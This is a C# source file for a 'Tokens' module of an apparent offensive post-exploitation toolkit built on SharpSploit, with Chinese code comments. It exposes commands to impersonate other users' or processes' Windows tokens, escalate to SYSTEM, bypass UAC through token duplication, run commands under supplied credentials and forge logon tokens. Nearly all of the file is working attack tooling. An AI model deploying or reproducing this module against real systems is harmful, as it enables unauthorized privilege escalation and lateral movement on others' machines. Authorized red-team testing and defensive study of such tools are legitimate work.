using ArgParseCS;
using SharpSploit.Credentials;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using TaotieToolkit.config;
using static SharpSploit.Execution.Win32;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.StartPanel;

namespace TaotieToolkit.modules.Credentials
{
    internal class Token : ICommand, ICommandMarker
    {
        public string Name => "Tokens";
        public string Description => "Token manipulation that can be used to impersonate other users, run commands as other user";
        private ArgParse argParse;
        Tokens tokens = new Tokens();
        private void DefineParams()
        {
            argParse = new ArgParse {
                new OptionSet("whoami") {
                    new Option("-w", "--whoami", "Gets the username of the currently used/impersonated token.", true, false),
                },
                new OptionSet("ImpersonateUser") {
                   new Option("-iu", "--ImpersonateUser", "Impersonate the token of a process owned by the specified user. Used to execute subsequent commands as the specified user. ", true, true),
                   new Option("-u", "--user", "User to impersonate. \"DOMAIN\\Username\" format expected..", true, true),
                },
                new OptionSet("ImpersonateProcess") {
                   new Option("-ip", "--ImpersonateProcess", "mpersonate the token of the specified process. Used to execute subsequent commands as the user associated with the token of the specified process. ", true, false),
                   new Option("-p", "--ProcessID", "Process ID of the process to impersonate.", true, true),
                },
                new OptionSet("GetSystem") {
                   new Option("-gs", "--GetSystem", "Impersonate the SYSTEM user. Equates to ImpersonateUser(\"NT AUTHORITY\\SYSTEM\"). ", true, false),
                },
                new OptionSet("BypassUAC") {
                   new Option("-bu", "--BypassUAC", "Bypasses UAC through token duplication and spawns a specified process with high integrity. ", true, false),
                },
                new OptionSet("RunAs") {
                   new Option("-ra", "--RunAs", "Makes a new token to run a specified function as a specified user with a specified password. Automatically calls RevertToSelf() after executing the function. ", true, false),
                   new Option("-d", "--domain", "Domain to authenticate the user to", true, true),
                   new Option("-u", "--username", "Username to execute Action as", true, true),
                   new Option("-p", "--password", "Password to authenticate the user", true, true),
                   new Option("-c", "--command", "Action to perform as the user", true, true),
                },
                new OptionSet("MakeToken") {
                   new Option("-mt", "--MakeToken", "Makes a new token with a specified username and password, and impersonates it to conduct future actions as the specified user.", true, true),
                   new Option("-d", "--domain", "Domain to authenticate the user to", true, true),
                   new Option("-u", "--username", "Username to execute Action as", true, true),
                   new Option("-p", "--password", "Password to authenticate the user", true, true),
                }
            };
        }
        public void Execute(string[] args)
        {


            DefineParams();
            if (args.Length == 0)
            {
                argParse.Usage();
                return;
            }
            try
            {
                argParse.Parse(args);
                OptionSet activeOptionSet = argParse.GetActiveOptionSet();
                // Console.Out.WriteLine("Active optionset: " + activeOptionSet.Name);

                switch (activeOptionSet.Name)
                {
                    case "whoami":
                        Console.WriteLine(tokens.WhoAmI());
                        break;
                    case "ImpersonateUser":
                        ImpersonateUser(activeOptionSet);
                        break;
                    case "ImpersonateProcess":
                        ImpersonateProcess(activeOptionSet);
                        break;
                    case "GetSystem":
                    
                        Console.WriteLine(tokens.GetSystem() ? "\t[*] Impersonate the token success" : "\t[*] Failed to impersonate the token");
                        break;
                    case "BypassUAC":
                        Console.WriteLine(tokens.BypassUAC() ? "\t[*] Impersonate the token success" : "\t[*] Failed to impersonate the token");
                        break;
                    case "RunAs":
                        RunAs(activeOptionSet);
                        break;
                    case "MakeToken":
                        MakeToken(activeOptionSet);
                        break;
                    default:
                        argParse.Usage();
                        return;
                }
            }
            catch (Exception exception)
            {
                // User control the exception
                System.Console.WriteLine("exception: " + exception.Message);
            }
        }
        public void ImpersonateUser(OptionSet activeOptionSet)
        {
            Option option = activeOptionSet.GetOption("-u");
            string Username = option.ParamValue;
            if (tokens.ImpersonateUser(Username))
            {
                Console.WriteLine("\t[*] Impersonate the token sucess");
            }
            else
            {

                Console.WriteLine("\t[-] Impersonate the token failed");
            }
        }

        public void ImpersonateProcess(OptionSet activeOptionSet)
        {
            Option option = activeOptionSet.GetOption("-p");
            UInt32 ProcessID = Convert.ToUInt32(option.ParamValue);
            if (tokens.ImpersonateProcess(ProcessID))
            {
                Console.WriteLine("\t[*] Impersonate the token sucess");
            }
            else
            {

                Console.WriteLine("\t[-] Impersonate the token failed");
            }
        }
        public void RunAs(OptionSet activeOptionSet)
        {
            Option option = activeOptionSet.GetOption("-u");
            string username = option.ParamValue;
            option = activeOptionSet.GetOption("-d");
            string domain;
            if (string.IsNullOrEmpty(option.ParamValue))
            {
                domain = "";
            }
            else
            {
                domain = option.ParamValue;
            }
            option = activeOptionSet.GetOption("-p");
            string password = option.ParamValue;
            option = activeOptionSet.GetOption("-c");
            string command = option.ParamValue;
            string result = tokens.RunAs<string>(username, domain, password, () => ExecuteCommand(command), Advapi32.LOGON_TYPE.LOGON32_LOGON_INTERACTIVE);
            Console.WriteLine(result);
        }
        public string ExecuteCommand(string command)
        {
            // 使用 ProcessStartInfo 来执行命令
            ProcessStartInfo processInfo = new ProcessStartInfo();
            processInfo.FileName = command;
            processInfo.UseShellExecute = false;
            processInfo.RedirectStandardOutput = true;

            // 执行命令并获取输出
            using (Process process = Process.Start(processInfo))
            {
                using (StreamReader reader = process.StandardOutput)
                {
                    string output = reader.ReadToEnd();
                    return output;
                }
            }
        }

        public void MakeToken(OptionSet activeOptionSet)
        {
            Option option = activeOptionSet.GetOption("-u");
            string username = option.ParamValue;
            option = activeOptionSet.GetOption("-d");
            string domain;
            if (string.IsNullOrEmpty(option.ParamValue))
            {
                domain = "";
            }
            else
            {
                domain = option.ParamValue;
            }
            option = activeOptionSet.GetOption("-p");
            string password = option.ParamValue;
            Advapi32.LOGON_TYPE logonType = Advapi32.LOGON_TYPE.LOGON32_LOGON_NEW_CREDENTIALS;

            if (tokens.MakeToken(username, domain, password, LogonType: logonType))
            {
                Console.WriteLine("\t[*] Token creation was successful.");
            }
            else
            {

                Console.WriteLine("\t[-] Token creation failed.");
            }
        }

        

    }
}
